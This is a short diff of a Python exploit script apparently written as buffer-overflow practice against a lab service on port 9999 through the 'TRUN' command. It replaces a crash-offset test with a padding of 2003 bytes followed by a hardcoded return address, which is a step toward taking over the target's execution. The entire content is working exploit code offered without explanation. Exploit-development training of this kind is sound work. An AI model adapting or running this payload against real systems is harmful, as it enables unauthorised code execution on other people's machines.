@@ -1,10 +1,10 @@
 #!/usr/bin/python
 
-import socket
 import sys
+import socket
 
-offset = b"A" * 2003 + b"B" * 4
-data = b"TRUN /.:/" + offset
+shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"
+data = b"TRUN /.:/" + shellcode
 
 ip = "192.168.1.11"
 port = 9999
